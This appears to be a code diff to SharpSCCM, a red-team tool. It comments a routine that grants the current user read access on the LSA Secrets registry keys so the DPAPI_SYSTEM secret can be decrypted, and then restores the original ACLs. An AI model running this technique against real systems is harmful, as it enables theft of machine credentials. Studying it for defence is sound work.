@@ -65,11 +65,14 @@ namespace SharpSCCM
             // NOTE: right now only the "DPAPI_SYSTEM" LSA secret is implemented, but others would be trivial
 
             bool alreadySystem = false;
-            string currentName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
-            RegistrySecurity originalAcl = new RegistrySecurity();
-            RegistrySecurity newAcl = new RegistrySecurity();
+
+            string currentName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;   // Get current user context
+            RegistrySecurity originalAcl = new RegistrySecurity();                              // Create a new ACL object to store the original registry key ACL
+            RegistrySecurity newAcl = new RegistrySecurity();                                   // Create a new ACL object to store the modified registry key ACL
             RegistryAccessRule newRule;
-            RegistrySecurity revertedAcl;
+            RegistrySecurity revertedAcl = new RegistrySecurity();                              // Create a new ACL object to store the reverted registry key ACL
+
+            // Registry keys that require permissions modification
             string[] LsaRegKeys = new string[] 
                 { 
                     "SECURITY\\Policy\\Secrets\\DPAPI_SYSTEM\\CurrVal\\",
@@ -105,10 +108,20 @@ namespace SharpSCCM
                     foreach (string key in LsaRegKeys)
                     {
                         Console.WriteLine("[*] Modifying permissions on registry key: {0}", key);
+
+                        // Backup the current ACL
                         originalAcl = Registry.LocalMachine.OpenSubKey(key, RegistryKeyPermissionCheck.ReadWriteSubTree, System.Security.AccessControl.RegistryRights.ReadPermissions).GetAccessControl();
+
+                        // Copy the current ACL into a new ACL
                         newAcl = originalAcl;
+
+                        // Create a new rule that grants the current user read permissions on the key
                         newRule = new RegistryAccessRule(currentName, RegistryRights.ReadKey, InheritanceFlags.None, PropagationFlags.None, AccessControlType.Allow);
+
+                        // Append the new rule to the new ACL
                         newAcl.AddAccessRule(newRule);
+
+                        // Apply the new ACL to the key
                         Registry.LocalMachine.OpenSubKey(key, RegistryKeyPermissionCheck.ReadWriteSubTree, System.Security.AccessControl.RegistryRights.ChangePermissions).SetAccessControl(newAcl);
                     }
                 }
@@ -135,6 +148,7 @@ namespace SharpSCCM
             byte[] IV = new byte[16];
             byte[] keyPathPlaintext = Crypto.LSAAESDecrypt(tmpKey, keyEncryptedDataRemainder);
 
+            // Revert reg key permissions to the original ACL
             if (reg)
             {
                 foreach (string key in LsaRegKeys)
